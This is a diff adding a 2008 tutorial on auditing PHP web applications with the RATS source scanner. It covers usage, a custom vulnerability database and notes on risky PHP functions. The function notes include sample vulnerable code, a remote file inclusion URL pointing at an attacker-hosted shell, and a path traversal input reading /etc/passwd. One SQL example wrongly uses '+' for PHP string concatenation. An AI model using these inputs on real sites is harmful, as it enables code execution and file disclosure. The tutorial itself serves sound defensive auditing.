@@ -1,0 +1,195 @@
+
+Using RATS to Audit PHP Web Applications 
+(c) 2008 dB <dB [at] rawsecurity.org>
+
+RATS Home: http://www.fortifysoftware.com/security-resources/rats.jsp
+HTML Version: http://rawsecurity.org/articles/RATS.html
+
++ Introduction
+
+RATS, Rough Auditing Tool for Security, is a free security auditing utility that
+scans C, C++, PHP, Perl, and Python source code. The tool does not find definite
+security bugs in the source code, but will simply find potentially dangerous
+function calls and give a brief description of the problem and possible
+remedies. While it can find many common security related programming errors,
+such as buffer overflows and race conditions, RATS is not geared to finding many
+of the common security vulnerabilities that plague web applications. Luckily,
+RATS can be given a custom vulnerability database in XML format to help identify
+issues such as cross-site scripting, SQL injection, remote file inclusion, and
+command injection vulnerabilities.
+
++ Basic Usuage
+
+Once you have RATS installed on your machine simply run the following command in
+the same directory of the PHP application in question.
+
+rats .
+
+A portion of the output is shown below.
+
+./src/plugins/contact-form/plugin-func.php:280: High: mail
+./src/plugins/gallery/plugin-func.php:656: High: mail
+./src/plugins/guestbook/plugin-func.php:376: High: mail Arguments 1, 2, 4 and 5
+of this function may be passed to an external program. (Usually sendmail). Under
+Windows, they will be passed to a remote email server. If these values are
+derived from user input, make sure they are properly formatted and contain no
+unexpected characters or extra data.
+
+RATS will scan each file specified and produce a vulnerability report once it is
+done. As you can see from the output, RATS located three uses of the mail
+function in the entire application. The filenames, line numbers, and warning
+levels will all be shown. You should then crack open each file and make sure
+that the input to the mail function isn't vulnerable to email injection.
+
+By default RATS will only show high and medium severity vulnerabilities. To
+show all possible problems use the following command,
+
+rats . -w 3
+
++ Vulnerability Databases
+
+RATS stores vulnerability information in XML format which makes it easy to
+alter. Consider a small example below.
+
+<VulnDB lang="php">
+	<Vulnerability>
+		<Name>include</Name>
+		<Info>
+			<Severity>High</Severity> 
+			<Description> The include() statement includes and
+evalutes the specified file. Make sure the input is properly sanitized to
+prevent a user from including a local or remote file. 
+			</Description> 
+		</Info>
+	</Vulnerability>
+</VulnDB>
+
+As you might have guessed, name is the name of the questionable method. Possible
+values for severity are High, Medium, or Low and correspond with the 1, 2, and 3
+warning levels using the -w option. The description will be displayed to the
+user when the method is found in a source code file.
+
+The -d command-line parameter allows a user to specify RATS to use an additional
+vulnerability database. In order to suppress the default databases use the -x
+option. Partial output of running rats . -d myVulDB.XML is shown below.
+
+./vuln.php:34: High: include The include() statement includes and evalutes the
+specified file. Make sure the input is properly sanitized to prevent a user from
+including a local or remote file.
+
+At this point you may want to look into how remote file inclusion works to
+understand why methods such as include and require should be scrutinized.
+
++ Function Explanations
+
+I've put together a vulnerability database specifically for web application
+audits available here (http://rawsecurity.org/articles/rats.xml). If you know of
+any additional PHP methods that should be identified in a security audit, then
+don't hesitate to send me an email. A brief description of each function in the
+database is shown below.
+
+base64_decode - Not dangerous by itself, but could be used to bypass
+magic_quotes_gpc.
+
+bzopen - See file.
+
+eval - Very dangerous. Evalutes a string as PHP code. Check for possible code
+injection.
+
+exec - Using user input with exec is very dangerous and could lead to a command
+injection vulnerability.
+
+extract - Imports variables from an array into the symbol table.
+
+Example vulnerable code. 
+extract($_GET); require($BASEDIR . "platform/fs.php");
+
+Very dangerous if the array happens to be _GET, _POST, or _COOKIE.
+index.php?basedir=http://path/to/attacker/shell/
+
+file - Check for a local file inclusion vulnerability. If the allow_url_fopen
+config directive is enabled then the file method can open remote resources as
+well.
+
+file_get_contents - See file.
+
+fopen - See file.
+
+gzopen - See file.
+
+header - The header method could be used for a HTTP Response Splitting or XSS
+attack.
+
+import_request_variables - Imports GET, POST, and/or Cookie variables into the
+global scope. This is like enabling register_globals on one specific form. Could
+lead to many different types of vulnerabilities.
+
+include - Possible code injection if the include method takes user input and it
+is not properly filtered.
+
+Example vulnerable code. 
+include "/pages/{$_GET['page']}.html";
+
+Depending on the environment it might be possible to terminate a string with the
+null character. This allows an attacker to get rid of the file extension (html
+in the example). 
+index.php?page=../../../../etc/passwd%00
+
+include_once - See include.
+
+mssql_query - Executes a query against a SQL Server database. Check how the user
+input is filtered for possible SQL injections.
+
+Example vulnerable code. 
+$sql = "SELECT * FROM pages WHERE id = $_POST['id']";
+mssql_query($sql);
+
+Not vulnerable if magic quotes is on. 
+$sql = "SELECT * FROM pages WHERE id = '" + $_POST['id'] + "'"; 
+mssql_query($sql);
+
+mysql_query - Executes a query against a MySQL database. See mssql_query.
+
+odbc_exec - Executes a SQL statements using Open Database Connectivity. See
+mssql_query.
+
+passthru - See exec.
+
+pg_query - Executes a query against a PostgreSQL database. See mssql_query.
+
+phpinfo - The phpinfo method shows configuration information about PHP.
+Depending on how the application is written, database access credentials may be
+exposed.
+
+popen - See file.
+
+preg_replace - Useful for making string replacements, but carries the same risk
+as the eval method if the 'e' modifier is used. The replacement parameter will
+be run as PHP code after the string replacement.
+
+proc_open - See exec.
+
+readfile - See file.
+
+require - See include.
+
+require_once - See include.
+
+setcookie - The setcookie method could be used for a HTTP Response Splitting or
+XSS attack.
+
+shell_exec - See exec.
+
+system - See exec.
+
+unserialize - Not dangerous by itself, but could be used to bypass
+magic_quotes_gpc.
+
+urldecode - Not dangerous by itself, but could be used to bypass
+magic_quotes_gpc. urldecode will convert %2527 into a single quote.
+
++ Summary
+
+As the name implies, RATS only provides a rough starting point to finding
+software vulnerabilities in applications. White box and black box testing should
+be used together to uncover security related bugs.
